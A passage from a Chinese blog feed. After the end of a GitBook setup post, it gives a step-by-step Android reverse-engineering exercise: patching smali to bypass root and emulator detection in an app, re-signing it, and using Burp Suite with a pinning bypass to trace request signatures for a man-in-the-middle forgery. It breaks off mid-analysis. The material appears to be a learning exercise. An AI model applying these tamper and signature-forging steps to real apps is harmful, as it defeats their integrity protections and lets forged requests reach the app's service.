spellcheck="true">&lt;!-- 自动从 Github Pages 的首页跳转到 GitBook 的首页 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0; url<span class="token punctuation">=</span>./gitbook/book/index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="站点优化：安装-GitBook-插件"><a href="#站点优化：安装-GitBook-插件" class="headerlink" title="站点优化：安装 GitBook 插件"></a>站点优化：安装 GitBook 插件</h2><p>GitBook 的精粹在于丰富的插件以扩展其功能，插件可通过工作目录下的 <a href="https://github.com/lyy289065406/exp-blog/blob/master/gitbook/book.json"><code>book.json</code></a> 配置并控制，相关说明见 <a href="https://docs.gitbook.com/v2-changes/important-differences#plugins">官方文档</a>。</p><p>推荐 GitBook 安装的插件可参考 <a href="http://gitbook.zhangjikai.com/plugins.html">这份清单</a> 。</p><p>根据插件命名约定，若 <strong>插件名称</strong> 为 <code>prism</code> ，则其对应 <strong>安装包名称</strong> 为 <code>gitbook-plugin-prism</code> 。</p><p>以 <code>prism</code> 插件为例，安装方式有两种：</p><ul><li>通过 GitBook 安装：把插件名称 <code>prism</code> 添加到 <code>book.json</code> 的 <code>plugins</code> 列表，执行 <code>gitbook install</code> 命令</li><li>通过 nodejs 安装：执行 <code>npm install gitbook-plugin-prism</code> 命令安装指定插件，然后把插件名称 <code>prism</code> 配置到 <code>book.json</code> 的 <code>plugins</code> 列表使其生效</li></ul><blockquote><p>　方法一每次执行都会检查现有插件是否需要更新。<br>　方法二只有特定插件受影响，适合于存在自定义修改过插件代码的情况。</p></blockquote><p>注意， Guthub Pages 不支持使用了 Octopress 框架的插件，详见 《<a href="https://help.github.com/en/github/working-with-github-pages/about-github-pages-and-jekyll">About GitHub Pages and Jekyll</a>》 。</p><p>若使用了这类插件，Guthub Pages 是无法发布成功的。 判定是不是使用了这类插件的方法也很简单：</p><ul><li>提交变更内容后，点击 Github 仓库下的 branch 查看 master 分支</li><li>master 分支会提示最近提交内容的 Guthub Pages 构建情况</li><li>若构建失败，可以点击 Details 查看详情</li><li>假如提示 <code>is not a recognised Liquid tag</code> 说明就是采用了 Octopress 框架的插件</li></ul><p><img src="./08.png"><br><img src="./09.png"><br><img src="./10.png"></p><h2 id="自定义域名"><a href="#自定义域名" class="headerlink" title="自定义域名"></a>自定义域名</h2><p>通过 GitHub Page 发布的站点有个问题，就是 URL 地址不方便记忆。</p><p>如果有申请个人域名的话，是可以自定义 GitHub Page 域名的。</p><p>首先需要购买域名解析服务，添加 CNAME 规则把个人域名解析到 GitHub Page，然后再在 GitHub Page 配置个人域名即可。</p><p><img src="./12.png"><br><img src="./13.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitBook </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 逆向学习笔记</title>
      <link href="/re/android-ni-xiang-xue-xi-bi-ji/"/>
      <url>/re/android-ni-xiang-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><table><thead><tr><th align="left">条项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">APP</td><td align="left">YZ.apk</td></tr><tr><td align="left">目标 A</td><td align="left">绕过 root限制</td></tr><tr><td align="left">目标 B</td><td align="left">拿到 abService 签名 key 并通过中间人改至少改一个包（通过签名验证）</td></tr></tbody></table><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><table><thead><tr><th align="left">内容</th><th align="center">推荐度</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><a href="https://developer.android.com/studio/run/managing-avds?hl=zh-cn">Android Studio 用户指南</a></td><td align="center">低</td><td align="left">IDE 说明文档，暂时还用不到</td></tr><tr><td align="left"><a href="https://segmentfault.com/a/1190000018453184">Mac 上可测试开发的安卓模拟器</a></td><td align="center">低</td><td align="left">MAC上搭建安卓模拟环境</td></tr><tr><td align="left"><a href="https://linux.cn/article-10024-1.html">在 VirtualBox 中安装 Android 系统</a></td><td align="center">低</td><td align="left">MAC上安装各种安卓模拟器失败后的折中方法</td></tr><tr><td align="left"><a href="https://www.jianshu.com/p/64ed26536601">Android 反编译及调试利器</a></td><td align="center">低</td><td align="left">一些常用工具</td></tr><tr><td align="left"><a href="https://www.imooc.com/article/20990">微信 Android SDK 反编译还原源码 进行修改重新编译</a></td><td align="center">低</td><td align="left">非入门级的思路指导</td></tr><tr><td align="left"><a href="https://open.appscan.io/article-708.html">移动安全: 通过逆向 APK 绕过 Android root 检测</a></td><td align="center">高</td><td align="left">apk为什么要限制root，检测root的原理是什么</td></tr><tr><td align="left"><a href="https://www.jianshu.com/p/eb766d2bb837">Android 反编译后重新打包</a></td><td align="center">高</td><td align="left">入门级思路指导</td></tr><tr><td align="left"><a href="https://www.jianshu.com/p/9931a1e77066">Android 逆向基础：Smali 语法</a></td><td align="center">高</td><td align="left">逆向后如何修改代码（非源码的中间代码）</td></tr><tr><td align="left"><a href="https://coderyuan.com/2018/04/19/smali-knowledge/">Smali 基础知识</a></td><td align="center">高</td><td align="left">逆向后如何修改代码（非源码的中间代码）</td></tr><tr><td align="left"><a href="https://blog.csdn.net/dreamer2020/article/details/52761606">安卓 apk 反编译、修改、重新打包、签名全过程</a></td><td align="center">高</td><td align="left">反编译后如何重新封包（使用JDK）</td></tr><tr><td align="left"><a href="https://blog.csdn.net/qq_30552993/article/details/83028285">Android 反编译 Apk，修改资源，重新打包，签名发布</a></td><td align="center">中</td><td align="left">反编译后如何重新封包（使用工具）</td></tr><tr><td align="left"><a href="http://www.520monkey.com/archives/1081">Android逆向之旅 — IDA动态调试SO</a></td><td align="center">高</td><td align="left">分析某拍短视频的数据请求加密协议</td></tr><tr><td align="left"><a href="https://bbs.pediy.com/thread-221536.htm">Inspeckage 安装教程</a></td><td align="center">低</td><td align="left">看看就好，可以不用到 Inspeckage</td></tr><tr><td align="left"><a href="https://la0s.github.io/2018/07/17/Inspeckage/">深入 Android 动态分析工具 Inspeckage</a></td><td align="center">低</td><td align="left">实例教程</td></tr><tr><td align="left"><a href="https://4hou.win/wordpress/?p=7516">Xposed知多少</a></td><td align="center">低</td><td align="left">入门科普</td></tr><tr><td align="left"><a href="https://www.jianshu.com/p/e2589341f698">inspeckage xposed 插件分析 app 及微信 Log</a></td><td align="center">低</td><td align="left">Inspeckage 案例参考</td></tr><tr><td align="left"><a href="https://laysent.com/blog/post/android-app-reverse-engineering-tutorial/">Android App 逆向工程初探</a></td><td align="center">高</td><td align="left">案例参考，逆向后如何找到 HTTP 签名算法</td></tr></tbody></table><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><table><thead><tr><th align="left">工具</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">jadx</td><td align="left">用于 apk 反编译（为可读的 java 源码）</td></tr><tr><td align="left">apktool</td><td align="left">用于 apk 反编译（为不易读的 Smali 中间码）<br>用于 Smali 重打包为 apk</td></tr><tr><td align="left">JDK</td><td align="left">keytool：用于生成自签名证书<br>jarsigner：用于给 apk 自签名</td></tr><tr><td align="left">网易 MuMu</td><td align="left">安卓模拟器（蓝叠不支持MAC，夜神又安装失败，最后没办法选了这个）</td></tr><tr><td align="left">Xposed</td><td align="left">用来胁持系统 API 的 hook 框架 （需要 root 系统才能装）</td></tr><tr><td align="left">Inspeckage</td><td align="left">Xposed 的一个模块，用于动态分析 app（事实上用不到）</td></tr><tr><td align="left">TrustMeAlready</td><td align="left">Xposed 的一个模块，用于绕过 SSL Pinning 防抓包（如果 APP 没有防抓包则用不到）<br>本来应该装 JustTrustMe 的，但是搜不到，用了这个替代</td></tr><tr><td align="left">Burp Suite</td><td align="left">用于抓包和中间人攻击</td></tr></tbody></table><h2 id="【目标-A】绕过-root-限制"><a href="#【目标-A】绕过-root-限制" class="headerlink" title="【目标 A】绕过 root 限制"></a>【目标 A】绕过 root 限制</h2><h3 id="A-1-解题思路"><a href="#A-1-解题思路" class="headerlink" title="A.1. 解题思路"></a>A.1. 解题思路</h3><p>通过文章《<a href="https://open.appscan.io/article-708.html">移动安全: 通过逆向 APK 绕过 Android root 检测</a>》可以知道，apk 的 root 检测都是通过（java）代码实现的，因此要绕过 root 的思路也很直白了：</p><ul><li>反编译 apk 安装包</li><li>找到 root 检测代码</li><li>修改检测逻辑，使其不生效（删除或固化其检测结果均可，只要没有多处埋点，一般只有程序入口一处）</li><li>重新打包为 apk 安装包</li><li>apk 自签名（apk 有防篡改机制，所有文件都会生成 hash 校验码，签名目的是重新生成这些校验码）</li><li>在启用 root 的模拟器上验证</li></ul><h3 id="A-2-解题过程"><a href="#A-2-解题过程" class="headerlink" title="A.2. 解题过程"></a>A.2. 解题过程</h3><h4 id="A-2-1-找到-root-检测入口"><a href="#A-2-1-找到-root-检测入口" class="headerlink" title="A.2.1. 找到 root 检测入口"></a>A.2.1. 找到 root 检测入口</h4><p>首先需要 root 检测入口的点在哪。</p><p>使用模拟器安装 YZ.apk 并运行，会提示【禁止在 Root 设备运行】，然后会直接关掉 APP 进程，而明显这就是我们需要绕过的逻辑。</p><p><img src="01.jpg"></p><p>鉴于已经有明显的检测提示【禁止在Root设备运行】，那么使用 jadx 反编译 YZ.apk，然后直接搜索源码哪里出现这个字符串即可，检测逻辑必定在附近。</p><blockquote><p>jadx 反编译得到的是 java 源码</p></blockquote><p><img src="02.jpg"></p><p>为了方便后续操作，jadx → 另存为 Gradle 项目（这里导出保存目录为 yz_jadx）</p><blockquote><p>Gradle 的定位类似于 Maven</p></blockquote><p><img src="03.jpg"></p><p>暂时不需要用到 IDE， 直接使用 ST3 打开导出的 Gradle 项目，全局搜索关键字【禁止在】，在文件 <code>src/main/res/values-zh/strings.xml</code> 找到唯一一条定义：【禁止在Root设备运行】</p><p><img src="04.jpg"></p><p>从目录编排上不难判断 <code>src/main/res/values-xx</code> 就是用于定义某国 xx 语言的提示字符串的 xml 配置文件，很明显这是一个多国语言的 APP。</p><p>而且从 xml 格式和内容来看，很明显定义了两个变量：</p><ul><li><code>warn_root_disabled</code> = “禁止在Root设备运行”</li><li><code>warn_emulator_disabled</code> = “禁止在模拟器上运行”</li></ul><p>与这两个变量相关的逻辑极可能都是我们需要绕过的。</p><p><img src="05.jpg"></p><p>再次全局搜索关键字【<code>warn_root_disabled</code>】，在文件 <code>src/main/java/com/xxx/oooooooooo/ui/main/MainActivity.java</code> 找到唯一一次代码引用：</p><p><img src="06.jpg"></p><p>查看 MainActivity.java 类的源码，发现明显被混淆过了。</p><p>不过不难判断方法 <code>private void e()</code> 内实现了【root 检测】和【模拟器检测】。因为前面搜索到的两个目标变量都在这里出现了：</p><ul><li><code>warn_root_disabled</code> = “禁止在Root设备运行”</li><li><code>warn_emulator_disabled</code> = “禁止在模拟器上运行”</li></ul><p><img src="07.jpg"></p><h4 id="A-2-2-修改-root-检测逻辑（java源码）"><a href="#A-2-2-修改-root-检测逻辑（java源码）" class="headerlink" title="A.2.2. 修改 root 检测逻辑（java源码）"></a>A.2.2. 修改 root 检测逻辑（java源码）</h4><p>其实从源码不难解读到：</p><ul><li><code>e.b()</code> 是用于检测模拟器的</li><li><code>e.a()</code> 是用于检测 root 的</li><li><code>k.a()</code> 应该是输出提示消息到 UI 的</li></ul><p>而最开始在模拟器上运行 YZ.apk 所诱发的提示【禁止在Root设备运行】，明显就是 <code>k.a((int) R.string.warn_root_disabled);</code> 这行代码执行结果。</p><p>那么要达到无法检测 root 的目标，只需要让 <code>k.a()</code> 所在的条件分支代码无法执行即可，例如这样修改代码：</p><p><img src="08.jpg"></p><p>但是修改 java 源码后，使用 <code>apktool b yz_jadx</code> 命令重新编译打包会报错：【brut.directory.PathNotExist: apktool.yml】</p><p><img src="09.jpg"></p><p>从 <a href="https://github.com/eleydur0g13/apktool/issues/9">Github issue</a> 找到原因，这是因为 yz_jadx 是通过 jadx 逆向得到的项目，亦即 yz_jadx 并不是 <code>apktool d</code> 命令逆向生成的，导致 apktool 找不到 apktool.yml 文件，从而无法重新打包。</p><h4 id="A-2-3-修改-root-检测逻辑（Smali中间码）"><a href="#A-2-3-修改-root-检测逻辑（Smali中间码）" class="headerlink" title="A.2.3. 修改 root 检测逻辑（Smali中间码）"></a>A.2.3. 修改 root 检测逻辑（Smali中间码）</h4><p>于是这里变更逆向的方法：使用 <code>apktool d YZ.apk</code> 命令反编译 YZ.apk ，得到目录名为 YZ 项目。</p><p>在目录下果然可以找到 apktool.yml 文件，在里面还记录了每个类的 JDK 编译版本为 8 （即 1.8）。</p><p><img src="10.jpg"></p><p>需要注意的是，使用 apktool 逆向出来的代码不是 java，而是名为 smali 的中间码。</p><p>根据前面所找到的 java 文件 <code>src/main/java/com/xxx/oooooooooo/ui/main/MainActivity.java</code>，可以对应找到的 smali 文件 <code>smali/com/xxx/oooooooooo/ui/main/MainActivity.smali</code>。</p><p>稍微学习一下 smali 语法，不难找到 smali 的 <code>.method private e()V</code> 就是 java 的 <code>private void e()</code>。</p><p>两种代码的对应关系整理如下：</p><table><thead><tr><th align="center">序号</th><th align="left">smali 中间码</th><th align="left">java 源码</th><th align="left">分析说明</th></tr></thead><tbody><tr><td align="center">01</td><td align="left"><code>.method private e()V</code><br>  …<br><code>.end method</code></td><td align="left"><code>private void e() {</code><br>  …<br><code>}</code></td><td align="left">定义方法</td></tr><tr><td align="center">02</td><td align="left"><code>.locals 4</code></td><td align="left">-</td><td align="left">声明方法内的局部变量个数</td></tr><tr><td align="center">03</td><td align="left"><code>.prologue</code></td><td align="left">-</td><td align="left">声明代码块开始位置</td></tr><tr><td align="center">04</td><td align="left"><code>.line 178</code></td><td align="left">-</td><td align="left">声明对应 java 源码的行数</td></tr><tr><td align="center">05</td><td align="left"><code>const/4 v1, 0x1</code></td><td align="left"><code>boolean z = true;</code></td><td align="left">变量赋值，v1 即 z</td></tr><tr><td align="center">06</td><td align="left"><code>const/4 v0, 0x0</code></td><td align="left"><code>boolean z2 = false;</code></td><td align="left">变量赋值，v0 即 z2</td></tr><tr><td align="center">07</td><td align="left"><code>const-string v2, ""</code></td><td align="left"><code>e.f4245a = ""</code></td><td align="left">变量赋值，v2 即 e.f4245a</td></tr><tr><td align="center">08</td><td align="left"><code>sput-object v2, Lcom/xxx/oooooooooo/common/g/e;-&gt;a:Ljava/lang/String;</code></td><td align="left">-</td><td align="left">根据操作指令 sput-object 猜测是初始化类 e 内的 String 成员变量 a，类似于 <code>e.a = null</code> ，因此怀疑这是执行了类 e 的构造函数</td></tr><tr><td align="center">09</td><td align="left"><code>invoke-static {}, Lcom/xxx/oooooooooo/common/g/e;-&gt;b()Z</code><br><code>move-result v2</code></td><td align="left"><code>e.b()</code></td><td align="left">从上下文推测，实际效果是 <code>e.f4245a = e.b()</code>，即 e 的成员变量 f4245a 会因为 <code>b()</code> 的结果而改变，而 <code>b()</code> 的作用前面分析过是检测是否在模拟器运行</td></tr><tr><td align="center">10</td><td align="left"><code>if-eqz v2, :cond_0</code></td><td align="left"><code>if (e.b())</code></td><td align="left">满足条件时，跳转到 <code>:cond_0</code> 位置</td></tr><tr><td align="center">11</td><td align="left"><code>const v0, 0x7f0d0464</code><br><code>invoke-static {v0}, Lcom/xxx/oooooooooo/c/k;→a(I)V</code><br><code>move v0, v1</code></td><td align="left"><br><code>k.a((int) R.string.warn_emulator_disabled);</code><br><code>z2 = true;</code></td><td align="left">0x7f0d0464 值为 2131559524，没意义，估计是初始化参数寄存器。<code>k.a()</code> 前面分析过是输出提示消息的，这里就是禁止模拟器运行分支，既是要绕过的目标之一，最后利用 z2 设置了分支 flag 标记</td></tr><tr><td align="center">12</td><td align="left"><code>:cond_0</code><br><code>invoke-static {}, Lcom/xxx/oooooooooo/common/g/e;→a()Z</code><br><code>move-result v2</code></td><td align="left"><br><code>e.a()</code></td><td align="left">从上下文推测，实际效果是 <code>e.f4245a = e.a()</code>，即 e 的成员变量 f4245a 会因为 a() 的结果而改变，而 <code>a()</code> 的作用前面分析过是检测是否在 root 环境运行</td></tr><tr><td align="center">13</td><td align="left"><code>if-eqz v2, :cond_2</code></td><td align="left"><code>if (e.a())</code></td><td align="left">满足条件时，跳转到 :cond_2 位置</td></tr><tr><td align="center">14</td><td align="left"><code>const v0, 0x7f0d0465</code><br><code>invoke-static {v0}, Lcom/xxx/oooooooooo/c/k;-&gt;a(I)V</code></td><td align="left"><br><code>k.a((int) R.string.warn_root_disabled);</code></td><td align="left">0x7f0d0465 值为 2131559525 ，没意义，估计是初始化参数寄存器，<code>k.a()</code> 前面分析过是输出提示消息的，这里就是禁止 root 运行分支，绕过目标之一</td></tr><tr><td align="center">15</td><td align="left"><code>:goto_0</code></td><td align="left">-</td><td align="left">从上下文分析，这个标签是从后面的代码回溯回来的</td></tr><tr><td align="center">16</td><td align="left"><code>if-eqz v1, :cond_1</code></td><td align="left"><code>if (z)</code></td><td align="left">满足条件时，跳转到 <code>:cond_1</code> 位置</td></tr><tr><td align="center">17</td><td align="left"><code>.line 192</code><br>…</td><td align="left"><code>j.a().postDelayed(new Runnable() {</code><br><code>  public void run() {</code><br><code>    com.xxx.oooooooooo.common.a.a.c();</code><br><code>  }</code><br><code>}</code></td><td align="left">这段代码的作用，根据上下文推测就是 终止进程</td></tr><tr><td align="center">18</td><td align="left"><code>:cond_1</code><br><code>return-void</code></td><td align="left"><code>return;</code></td><td align="left">直接从当前函数返回</td></tr><tr><td align="center">19</td><td align="left"><code>:cond_2</code><br><code>move v1, v0</code></td><td align="left"><br><code>z = z2;</code></td><td align="left">利用 z 设置了分支 flag 标记</td></tr><tr><td align="center">20</td><td align="left"><code>goto :goto_0</code></td><td align="left">-</td><td align="left">无条件跳转到 <code>:goto_0</code> 位置</td></tr></tbody></table><p>更具体的对应关系见下图：</p><p><img src="11.jpg"></p><p>有了对应关系，结合前面修改 java 代码的思路，其实就很容易修改 smali 代码了：</p><ul><li>方案1：只要使得在执行 <code>if (z)</code> 时（对应上表16行），令 <code>z == false</code> 即可</li><li>方案2：直接注释/删除掉终止进程的代码（对应上表17行）</li></ul><p>方案2其实是最简单的，但是我有个顾虑就是：smali 用 .line 标记了对应 java 源码的行数，我担心 smali 会像汇编一样，如果不使用类似 nop 的空语句去填充会使得重编译后的文件无法执行。</p><p>因此我采用了方案1，不改动代码行数的前提下，通过跳转实现条件分支的绕过。</p><p>其实方法也很简单，只需要把上表第 10 行和第 13 行的 <code>if-eqz</code> 条件跳转改成无条件跳转即可。</p><table><thead><tr><th align="left">修改前</th><th align="left">修改后</th></tr></thead><tbody><tr><td align="left"><code>if-eqz v2, :cond_0</code></td><td align="left"><code>goto :cond_0</code></td></tr><tr><td align="left"><code>if-eqz v2, :cond_2</code></td><td align="left"><code>goto :cond_2</code></td></tr></tbody></table><p><img src="12.jpg"></p><h4 id="A-2-4-重新编译打包"><a href="#A-2-4-重新编译打包" class="headerlink" title="A.2.4. 重新编译打包"></a>A.2.4. 重新编译打包</h4><p>因为前面已经从 apktool.yml 知道这个 apk 原本是使用 JDK 1.8 编译的，</p><p>重新编译前需要注意设置系统环境变量，把 JDK 版本切换到 1.8 ：</p><p><img src="13.jpg"></p><p>执行命令 apktool b YZ，在目录 YZ/dist/ 下会生成新的 YZ.apk 文件 ：</p><p><img src="14.jpg"></p><h4 id="A-2-5-签名"><a href="#A-2-5-签名" class="headerlink" title="A.2.5. 签名"></a>A.2.5. 签名</h4><p>新生成的 YZ.apk 是不能够安装的，原因是安卓有防篡改机制，会把所有文件的 Hash 校验码记录到 META-INF/MANIFEST.MF 文件。</p><p>而刚刚我们修改过代码，Hash 校验码必定已经改变。</p><p>而对安装包签名目的之一是重新生成 META-INF/MANIFEST.MF 。</p><p><img src="15.jpg"></p><p>签名采用自签名即可，可以直接使用 JDK 自带的工具执行。</p><p>首先生成证书：<code>keytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore</code></p><p>根据提示随便填写即可。</p><p><img src="16.jpg"></p><p>然后使用这个证书对刚才重新编译的 YZ.apk 自签名：<code>jarsigner -verbose -keystore demo.keystore YZ.apk demo.keystore</code></p><p>得到最终的 YZ.apk。</p><p><img src="17.jpg"></p><p>使用 jadx 打开签名后的 YZ.apk，可以确认到刚才的签名信息：</p><p><img src="18.jpg"></p><p>在模拟器上安装 YZ.apk 并运行，成功绕过 root 检测。</p><h2 id="【目标-B】通过-abServer-签名验证"><a href="#【目标-B】通过-abServer-签名验证" class="headerlink" title="【目标 B】通过 abServer 签名验证"></a>【目标 B】通过 abServer 签名验证</h2><h3 id="B-1-解题思路"><a href="#B-1-解题思路" class="headerlink" title="B.1. 解题思路"></a>B.1. 解题思路</h3><ul><li>在模拟器运行 YZ，并在 YZ 中执行某些操作</li><li>利用 Burp Suite 对模拟器抓包</li><li>观察所执行的操作对应触发的 HTTP 请求</li><li>通过 HTTP 请求的特征（URL、参数等）在反编译代码中定位大概位置</li><li>找到 HTTP 请求参数中 signature 签名值的来源，分析其生成算法</li><li>篡改 HTTP 请求参数并对其签名，并通过算法生成新的 signature 并发送到服务器，实现中间人攻击</li></ul><h3 id="B-2-解题过程"><a href="#B-2-解题过程" class="headerlink" title="B.2. 解题过程"></a>B.2. 解题过程</h3><h4 id="B-2-1-搭建抓包环境"><a href="#B-2-1-搭建抓包环境" class="headerlink" title="B.2.1. 搭建抓包环境"></a>B.2.1. 搭建抓包环境</h4><p><strong>【搭建 xposed 环境（可选）】</strong></p><p>在安卓模拟器上安装 Xposed，再安装 Inspeckage 和 TrustMeAlready 模块，然后通过 Inspeckage 启动 YZ ：</p><p><img src="19.jpg"></p><p>MAC 下的相关命令：</p><ul><li>重启 adb 服务并连接到 adb shell： <code>adb kill-server &amp;&amp; adb server &amp;&amp; adb shell</code></li><li>转发 Inspeckage 的 web 服务端口：<code>adb forward tcp:8008 tcp:8008</code></li><li>转发 Inspeckage 的 LogCat 服务端口：<code>adb forward tcp:8887 tcp:8887</code></li></ul><p><img src="20.jpg"></p><p>此时通过浏览器打开 <a href="http://127.0.0.1:8008/">http://127.0.0.1:8008/</a> 即可查看 YZ 详细的 APP 信息：</p><p><img src="21.jpg"></p><p><strong>【搭建 Burp Suite 环境（必须）】</strong></p><p>依次点选：Burp Suite → Proxy → Options → Proxy Listeners → Add → Binding</p><p>-【Bind to port】随便填写即可（如当前为 8080）<br>-【Bind to address】选择 Specific address 并选择局域网 IP （如当前为 192.168.1.104）</p><p><img src="22.jpg"></p><p>在网易 MuMu 依次点选： 设置 → WLAN → 长按 → 修改网络 → 高级选型 → 代理 → 手动</p><p>-【代理服务器主机名】填写 Burp Suite 监听的 IP （如当前为 192.168.1.104）<br>-【代理服务器端口】填写 Burp Suite 监听的端口（如当前为 8080）</p><p><img src="23.jpg"></p><p>如上配置好后，即可从 Burp Suite → Proxy →  HTTP history 查看抓到的各个 HTTP 请求：</p><p><img src="24.jpg"></p><h4 id="B-2-2-观察-amp-分析包特征"><a href="#B-2-2-观察-amp-分析包特征" class="headerlink" title="B.2.2. 观察 &amp; 分析包特征"></a>B.2.2. 观察 &amp; 分析包特征</h4><p>不难发现，在启动 YZ 后，已经发出了相当一部分 HTTP 请求。观察这些请求参数的特征，几乎都带了 token 和 signature 两个参数。</p><p>测试发现：</p><ul><li>token：当前会话的固定值，每次重新登录 YZ 后会变化</li><li>signature：<br>  o 大部分都是 32 位，形似 MD5<br>  o 少量（如 <code>/bifrost/msg/scanWithSecurityMsg</code>） 是一个 RSA 的数字签名 （事实上从代码发现，签名用的是 SHA256withRSA，加密用的是 AES ）<br>  o 直接计算请求参数的 MD5 ，与 signature 并不一致，说明 signature 加了 salt<br>  o 不同请求的 signature 都不一样，但重发同一个请求，服务端均返回成功，说明 signature 没有用时间作为 salt<br>  o 修改请求参数中的任意内容并发送，服务端返回 400: signature is empty or is not equal ，结合前面几点推测，salt 可能是一个固定值<br>  o 修改 token 并发送，服务端返回 401: token is empty or not exists，推测 signature 的计算过程中并没有 token 参与</li></ul><p><img src="25.jpg"></p><h4 id="B-2-3-代码逆向分析"><a href="#B-2-3-代码逆向分析" class="headerlink" title="B.2.3. 代码逆向分析"></a>B.2.3. 代码逆向分析</h4><p>从前一节分析已经知道，signature 含有两种（甚至以上的形式）：MD5 和 RSA 。</p><p>要实现题目要求的中间人攻击，则需要成功伪造签名，亦即需要找到 signature 的计算方法。</p><p>简单起见，下面以 MD5 形式的 signature 作为目标展开分析。</p><p>这里从修改 YZ 个人信息入手，例如修改【电话】。</p><p>保存修改后，在 Burp Suite 捕获到 URL 为【/xxx-abService/ab/employee/phone】的请求。</p><p><img src="26.jpg"></p><p>在逆向的 java 代码中全局查找关键字【/xxx-abService/ab/employee/phone】</p><p>可以从 <code>src/main/java/com/xxx/oooooooooo/core/d/f.java</code> 类中找到唯一值【UPDATE_USER_PHONE(“/xxx-abService/ab/employee/phone”)】</p><p>而且很明显，<code>src/main/java/com/xxx/oooooooooo/core/d/f.java</code> 类是定义了所有 URL 的枚举对象。</p><blockquote><p>注：为了便于分析代码逻辑（调用跳转等），建议先把逆向代码导入 Eclipse 等 IDE 再分析。</p></blockquote><p><img src="27.jpg"></p><p>再全局查找关键字【UPDATE_USER_PHONE】，可以从 <code>src/main/java/com/xxx/oooooooooo/core/d/d.java</code> 类中找到唯一调用它的函数【<code>public c&lt;UserPhoneResponse&gt; c(String str, String str2)</code>】。</p><p>简单分析代码可以知道：</p><ul><li><code>src/main/java/com/xxx/oooooooooo/core/d/d.java</code> 类是 abService 所有 API 的接口实现</li><li>【<code>public c&lt;UserPhoneResponse&gt; c(String str, String str2)</code>】函数是接口  “<code>/xxx-abService/ab/employee/phone</code>“ 的实现</li><li>该函数的主要作用是构造接口的 HTTP 请求参数 params （Builder 类使用了构造者模式，其作用就是填充 HTTP 结构体的内容）</li><li>从实现逻辑看，只是构造了参数 params ，而 token 和 signature 参数并未被构造</li><li>观察其他接口实现的函数，均未构造 token 和 signature 参数</li><li>推测 token 和 signature 被封装到同一个地方实现，而最可疑的就是【<code>return a( .... )</code>】函数</li></ul><p><img src="28.jpg"></p><p>因为逆向代码被混淆的关系，出现了很多同名类、同名方法，导致 Eclipse 的函数调用跳转功能出现偏差。</p><p>若直接跳转到【<code>return a( .... )</code>】函数的实现，会跳到一个接口【<code>com.xxx.oooooooooo.data.api.g.java</code>】定义的方法【<code>c&lt;GroupsResponse&gt; a(long j, int i);</code>】</p><p>事实上从函数定义的入参表就可以发现，这是不对的（当时分析代码的时候就被这里卡住了好长时间）。</p><p><img src="29.jpg"></p><p>因此这里只能通过人工分析【<code>return a( .... )</code>】函数的实现位置：</p><ul><li>由于函数 a 在调用时没有声明类名，它应该不是静态方法，因此应该在父类或本类中</li><li>从实际传给函数 a 的入参推测，其函数定义应该形如【<code>c&lt;T&gt; a(Class&lt;T&gt; xxx, Builder yyy)</code>】</li><li>但是因为代码混淆导致变量名随机化的关系，这个函数定义中可以确定用于全局搜索的部分只有【<code>&gt; a(Class&lt;</code>】<br>根据这些特征搜索，发现该函数的实现就是在本类的最开头的位置，名为【<code>private &lt;RESULT extends NoProguard&gt; c&lt;RESULT&gt; a(Class&lt;RESULT&gt; cls, Builder builder)</code>】</li></ul><p><img src="30.jpg"></p><p>但是从设个函数中并不能直观地看到 token 和 signature 被构造的痕迹，不过可以发现 builder 参数确实被送到函数 a(builder) 中被处理了。</p><p>遗憾的是，同样因为混淆的关系，这些 a 类、a 方法全部都关联到了错误的位置。</p><p>不过可以从侧面分析还是可以得到一些信息的：</p><ul><li>首先这是一个模板函数，函数的出参命名为 <code>&lt;RESULT&gt;</code>，因此猜测【<code>this.f4523c.a( ... )</code>】原本应该是类似于【<code>response = this.APIs.call( request )</code>】的定义</li><li>f4523c 的对象类型为 <code>com.xxx.oooooooooo.data.api.e.java</code> 类，这个类有不少诸如 ApiResponse、HttpResponse 的处理，佐证了前面的猜想</li></ul><p><img src="31.jpg"></p><p>那么问题的关键再次回到函数【<code>this.f4523c.a( ... )</code>】的入参【<code>new a( ... )</code>】</p><p>这个类定义在哪里? 它很可能就是为 Builder 添加  token 和 signature 的关键。</p><p><img src="32.jpg"></p><p>这里其实还有一个隐晦的提示，在 Java 中：</p><ul><li>同一个类中若 import 两个同名类，至少其中一个要使用全类路径</li><li>同 package 下的非私有类可以无需 import 直接使用</li></ul><p>而【<code>new a( ... )</code>】的使用方式极可能就是后者，于是在 d.java 类的相同 package 下找到了 <code>src/main/java/com/xxx/oooooooooo/core/d/a.java</code> 